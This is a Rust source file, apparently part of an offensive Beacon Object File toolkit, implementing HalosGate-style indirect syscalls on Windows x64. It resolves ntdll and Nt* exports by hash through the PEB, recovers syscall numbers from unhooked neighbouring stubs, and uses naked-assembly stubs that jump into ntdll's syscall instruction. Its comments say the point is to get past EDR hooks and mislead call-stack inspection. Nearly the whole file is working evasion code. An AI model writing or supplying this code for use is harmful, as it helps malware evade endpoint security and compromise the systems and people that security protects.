// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//
//! HalosGate-style indirect syscall resolver + dispatch stub.
//!
//! Strategy:
//! 1. Walk the PEB InLoadOrderModuleList; locate `ntdll.dll` by
//!    case-insensitive djb2 hash of the BaseDllName UTF-16 string.
//! 2. Parse the PE export directory; locate the target Nt* function by
//!    djb2 hash of its ASCII export name.
//! 3. Read the first 32 bytes of the function:
//!      - Clean stub (`mov r10, rcx; mov eax, SSN; ...; syscall; ret`) → SSN at +4.
//!      - Hooked (`jmp` / `call`) → scan ±N neighbour exports sorted by RVA;
//!        Nt syscall numbers are sequential, so SSN = neighbour_ssn ± offset.
//! 4. Dispatch via `jmp <ntdll syscall instruction address>` — keeps the
//!    call-stack legible from an EDR's perspective; the `syscall` opcode lives
//!    inside ntdll, not in BOF .text.

#![cfg(all(target_os = "windows", target_arch = "x86_64"))]
#![allow(non_snake_case)]

use core::ffi::c_void;
use core::sync::atomic::{AtomicU16, AtomicUsize, Ordering};

use windows_sys::Win32::Foundation::NTSTATUS;

use crate::hash::djb2;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SyscallError {
    NtdllNotFound,
    ExportNotFound,
    HookedAndNoNeighbour,
}

#[repr(C)]
struct ListEntry { flink: *mut ListEntry, blink: *mut ListEntry }

#[repr(C)]
struct LdrDataTableEntry {
    in_load_order_links: ListEntry,
    in_memory_order_links: ListEntry,
    in_initialization_order_links: ListEntry,
    dll_base: *mut c_void,
    entry_point: *mut c_void,
    size_of_image: u32,
    full_dll_name: UnicodeString,
    base_dll_name: UnicodeString,
}

#[repr(C)]
struct UnicodeString { length: u16, max_length: u16, buffer: *mut u16 }

#[repr(C)]
struct PebLdrData {
    length: u32,
    initialized: u8,
    ss_handle: *mut c_void,
    in_load_order_module_list: ListEntry,
}

#[repr(C)]
struct Peb { _r0: [u8; 24], ldr: *mut PebLdrData }

#[inline(always)]
unsafe fn current_peb() -> *mut Peb {
    let peb: *mut Peb;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nomem, nostack));
    peb
}

/// Walk PEB, return base address of module whose BaseDllName matches `hash`.
unsafe fn find_module(target_hash: u32) -> Option<*mut c_void> {
    let peb = current_peb();
    let ldr = (*peb).ldr;
    let head = &mut (*ldr).in_load_order_module_list as *mut ListEntry;
    let mut cur = (*head).flink;
    while cur != head {
        let entry = cur as *mut LdrDataTableEntry;
        let name = &(*entry).base_dll_name;
        if !name.buffer.is_null() && name.length > 0 {
            let len = (name.length / 2) as usize;
            let slice = core::slice::from_raw_parts(name.buffer, len);
            let mut buf = [0u8; 64];
            let n = crate::str_util::wide_to_ascii_buf(slice, &mut buf);
            if crate::hash::djb2_case_insensitive(&buf[..n]) == target_hash {
                return Some((*entry).dll_base);
            }
        }
        cur = (*cur).flink;
    }
    None
}

/// Parse PE exports, return raw function pointer matching `api_hash`.
unsafe fn find_export(module: *mut c_void, api_hash: u32) -> Option<*mut c_void> {
    let base = module as *const u8;
    let dos = base as *const ImageDosHeader;
    if (*dos).e_magic != 0x5A4D { return None; }
    let nt  = base.add((*dos).e_lfanew as usize) as *const ImageNtHeaders64;
    if (*nt).signature != 0x00004550 { return None; }
    let export_dir = &(*nt).optional_header.data_directory[0];
    if export_dir.virtual_address == 0 { return None; }
    let exp = base.add(export_dir.virtual_address as usize) as *const ImageExportDirectory;
    let names    = base.add((*exp).address_of_names as usize) as *const u32;
    let ordinals = base.add((*exp).address_of_name_ordinals as usize) as *const u16;
    let funcs    = base.add((*exp).address_of_functions as usize) as *const u32;
    for i in 0..(*exp).number_of_names as usize {
        let name_rva = *names.add(i);
        let name_ptr = base.add(name_rva as usize);
        let mut len = 0usize;
        while *name_ptr.add(len) != 0 { len += 1; }
        let slice = core::slice::from_raw_parts(name_ptr, len);
        if djb2(slice) == api_hash {
            let ord = *ordinals.add(i) as usize;
            let func_rva = *funcs.add(ord);
            return Some(base.add(func_rva as usize) as *mut c_void);
        }
    }
    None
}

// Public-facing wrappers around the internal helpers. DFR (`common::dfr`)
// uses these; we don't want to make `find_module`/`find_export` themselves
// public because their signatures may evolve, and exposing the raw helpers
// invites misuse.
pub unsafe fn find_module_pub(hash: u32) -> Option<*mut c_void> { find_module(hash) }
pub unsafe fn find_export_pub(m: *mut c_void, hash: u32) -> Option<*mut c_void> { find_export(m, hash) }

#[repr(C)] struct ImageDosHeader { e_magic: u16, _r: [u8; 58], e_lfanew: i32 }
#[repr(C)] struct ImageDataDirectory { virtual_address: u32, size: u32 }
#[repr(C)] struct ImageOptionalHeader64 {
    _r0: [u8; 112],
    data_directory: [ImageDataDirectory; 16],
}
#[repr(C)] struct ImageFileHeader { _r: [u8; 20] }
#[repr(C)] struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}
#[repr(C)] struct ImageExportDirectory {
    _r0: [u8; 20],                    // Characteristics, TimeDateStamp, versions, Name, Base
    number_of_functions: u32,         // offset 20
    number_of_names: u32,              // offset 24
    address_of_functions: u32,         // offset 28
    address_of_names: u32,             // offset 32
    address_of_name_ordinals: u32,     // offset 36
}

/// Per-API cached resolution: (SSN, syscall_instr_address).
pub struct SyscallEntry {
    ssn: AtomicU16,
    syscall_addr: AtomicUsize,
}
impl SyscallEntry {
    pub const fn new() -> Self {
        Self { ssn: AtomicU16::new(u16::MAX), syscall_addr: AtomicUsize::new(0) }
    }
}

/// Resolve SSN + address of the `syscall` instruction inside ntdll for the
/// given API name hash. Caches on success.
pub unsafe fn resolve(entry: &SyscallEntry, api_hash: u32) -> Result<(u16, usize), SyscallError> {
    let cached_ssn = entry.ssn.load(Ordering::Acquire);
    let cached_addr = entry.syscall_addr.load(Ordering::Acquire);
    if cached_ssn != u16::MAX && cached_addr != 0 {
        return Ok((cached_ssn, cached_addr));
    }
    const NTDLL_HASH: u32 = crate::hash::djb2_case_insensitive(b"ntdll.dll");
    let ntdll = find_module(NTDLL_HASH).ok_or(SyscallError::NtdllNotFound)?;
    let func = find_export(ntdll, api_hash).ok_or(SyscallError::ExportNotFound)?;

    // Inspect stub
    let bytes = core::slice::from_raw_parts(func as *const u8, 32);
    let ssn = if bytes[0..3] == [0x4C, 0x8B, 0xD1] && bytes[3] == 0xB8 {
        // Clean: mov r10, rcx; mov eax, imm32
        u16::from_le_bytes([bytes[4], bytes[5]])
    } else {
        // Hooked — scan neighbours
        halos_gate(ntdll, func)?
    };
    // Locate a `syscall; ret` instruction. If the target stub is clean we
    // use its own; if hooked we route through a universal gadget elsewhere
    // in ntdll so the actual syscall instruction still belongs to ntdll —
    // never to BOF .text. This keeps the call-stack legible to EDR.
    let syscall_addr = match find_syscall_insn(func) {
        Some(a) => a,
        None => crate::evasion::find_universal_syscall_gadget(ntdll)
            .ok_or(SyscallError::HookedAndNoNeighbour)?,
    };

    entry.ssn.store(ssn, Ordering::Release);
    entry.syscall_addr.store(syscall_addr, Ordering::Release);
    Ok((ssn, syscall_addr))
}

/// Reconstruct SSN from neighbours: rebuild a sorted list of (rva, name_hash)
/// for ntdll exports, locate target, walk +/- up to 16 neighbours looking for
/// a clean stub. SSN delta = neighbour_index - target_index.
unsafe fn halos_gate(ntdll: *mut c_void, func: *mut c_void) -> Result<u16, SyscallError> {
    let base = ntdll as *const u8;
    let dos = base as *const ImageDosHeader;
    let nt  = base.add((*dos).e_lfanew as usize) as *const ImageNtHeaders64;
    let export_dir = &(*nt).optional_header.data_directory[0];
    let exp = base.add(export_dir.virtual_address as usize) as *const ImageExportDirectory;
    let funcs = base.add((*exp).address_of_functions as usize) as *const u32;
    let count = (*exp).number_of_names as usize;

    // Collect (rva, index) into a fixed-size array on stack (up to 4096 exports)
    let mut entries: [(u32, usize); 4096] = [(0, 0); 4096];
    let n = core::cmp::min(count, 4096);
    for i in 0..n {
        let rva = *funcs.add(i);
        entries[i] = (rva, i);
    }
    // Sort by RVA (simple insertion sort — small N typical)
    for i in 1..n {
        let mut j = i;
        while j > 0 && entries[j-1].0 > entries[j].0 {
            entries.swap(j-1, j);
            j -= 1;
        }
    }
    let target_rva = (func as usize - base as usize) as u32;
    let target_idx = entries[..n].iter().position(|e| e.0 == target_rva).ok_or(SyscallError::HookedAndNoNeighbour)?;
    // Walk neighbours
    for offset in 1..=16usize {
        for &(direction, sign) in &[(1isize, 1i32), (-1isize, -1i32)] {
            let probe = target_idx as isize + direction * offset as isize;
            if probe < 0 || probe as usize >= n { continue; }
            let probe_rva = entries[probe as usize].0;
            let stub = base.add(probe_rva as usize);
            let bytes = core::slice::from_raw_parts(stub, 8);
            if bytes[0..3] == [0x4C, 0x8B, 0xD1] && bytes[3] == 0xB8 {
                let neighbour_ssn = u16::from_le_bytes([bytes[4], bytes[5]]);
                let reconstructed = (neighbour_ssn as i32) - (sign * offset as i32);
                if reconstructed >= 0 && reconstructed <= u16::MAX as i32 {
                    return Ok(reconstructed as u16);
                }
            }
        }
    }
    Err(SyscallError::HookedAndNoNeighbour)
}

unsafe fn find_syscall_insn(stub: *mut c_void) -> Option<usize> {
    let bytes = core::slice::from_raw_parts(stub as *const u8, 32);
    for i in 0..bytes.len()-1 {
        if bytes[i] == 0x0F && bytes[i+1] == 0x05 {
            return Some(stub as usize + i);
        }
    }
    None
}

/// Dispatch a 4-arg-or-fewer syscall.
///
/// Windows x64 ABI for this naked fn:
///   arg0 → RCX, arg1 → RDX, arg2 → R8, arg3 → R9,
///   arg4 (ssn) → [rsp+0x28], arg5 (syscall_addr) → [rsp+0x30]
///
/// Syscall ABI requires arg0 in R10 (not RCX) and SSN in EAX, so we
/// shuffle: copy RCX→R10, load syscall_addr→R11 (scratch), load SSN→EAX,
/// then `jmp R11` into the `syscall; ret` instruction inside ntdll.
/// Loading syscall_addr first (into R11) preserves it across the EAX
/// load, which would otherwise clobber a value placed in RAX.
#[naked]
pub unsafe extern "system" fn do_syscall4(
    _arg0: usize, _arg1: usize, _arg2: usize, _arg3: usize,
    _ssn: u16,    _syscall_addr: usize,
) -> NTSTATUS {
    core::arch::naked_asm!(
        "mov r10, rcx",                              // arg0 → R10 (syscall convention)
        "mov r11, qword ptr [rsp + 0x30]",           // R11 = syscall_addr (arg5)
        "mov eax, dword ptr [rsp + 0x28]",           // EAX = SSN  (arg4, low word)
        "jmp r11",                                    // jump into ntdll's `syscall; ret`
    );
}

/// 5-arg syscall (e.g. NtQueryInformationProcess, NtQuerySystemInformation
/// when 5th arg is non-null ReturnLength).
///
/// Args 0-3 in registers, arg4 at [rsp+0x28], ssn at [rsp+0x30],
/// syscall_addr at [rsp+0x38]. The kernel reads arg4 from [rsp+0x28]
/// directly (already there), so we only need to shuffle ssn/syscall_addr
/// out of the way.
#[naked]
pub unsafe extern "system" fn do_syscall5(
    _arg0: usize, _arg1: usize, _arg2: usize, _arg3: usize,
    _arg4: usize,
    _ssn: u16,    _syscall_addr: usize,
) -> NTSTATUS {
    core::arch::naked_asm!(
        "mov r10, rcx",
        "mov r11, qword ptr [rsp + 0x38]",
        "mov eax, dword ptr [rsp + 0x30]",
        "jmp r11",
    );
}

/// 6-arg syscall (e.g. NtCreateThreadEx).
#[naked]
pub unsafe extern "system" fn do_syscall6(
    _arg0: usize, _arg1: usize, _arg2: usize, _arg3: usize,
    _arg4: usize, _arg5: usize,
    _ssn: u16,    _syscall_addr: usize,
) -> NTSTATUS {
    core::arch::naked_asm!(
        "mov r10, rcx",
        "mov r11, qword ptr [rsp + 0x40]",
        "mov eax, dword ptr [rsp + 0x38]",
        "jmp r11",
    );
}

/// 10-arg syscall (e.g. NtCreateThreadEx).
///
/// Caller (Windows ABI) places args 4..9 at [rsp+0x28..rsp+0x50] (24 bytes
/// shadow + 6 stack args), ssn at [rsp+0x58], syscall_addr at [rsp+0x60].
/// The kernel reads stack args 4..9 from the same offsets, so we only need
/// to shuffle SSN and the gadget address out of the way.
#[naked]
pub unsafe extern "system" fn do_syscall10(
    _arg0: usize, _arg1: usize, _arg2: usize, _arg3: usize,
    _arg4: usize, _arg5: usize, _arg6: usize, _arg7: usize,
    _arg8: usize, _arg9: usize,
    _ssn: u16,    _syscall_addr: usize,
) -> NTSTATUS {
    core::arch::naked_asm!(
        "mov r10, rcx",
        "mov r11, qword ptr [rsp + 0x60]",
        "mov eax, dword ptr [rsp + 0x58]",
        "jmp r11",
    );
}

/// Convenience: resolve SSN + syscall instruction address from an api hash,
/// using a one-shot SyscallEntry. Prefer the `resolve()` form with a static
/// `SyscallEntry` for hot paths (caches across calls).
pub unsafe fn resolve_ssn(api_hash: u32) -> Result<(u16, usize), SyscallError> {
    let entry = SyscallEntry::new();
    resolve(&entry, api_hash)
}

#[macro_export]
macro_rules! nt_syscall {
    ($api:literal, $($args:expr),*) => {{
        static ENTRY: $crate::syscalls::SyscallEntry = $crate::syscalls::SyscallEntry::new();
        const HASH: u32 = $crate::hash::djb2($api.as_bytes());
        match $crate::syscalls::resolve(&ENTRY, HASH) {
            Ok((_ssn, _addr)) => {
                Ok((_ssn, _addr))
            }
            Err(e) => Err(e),
        }
    }};
}
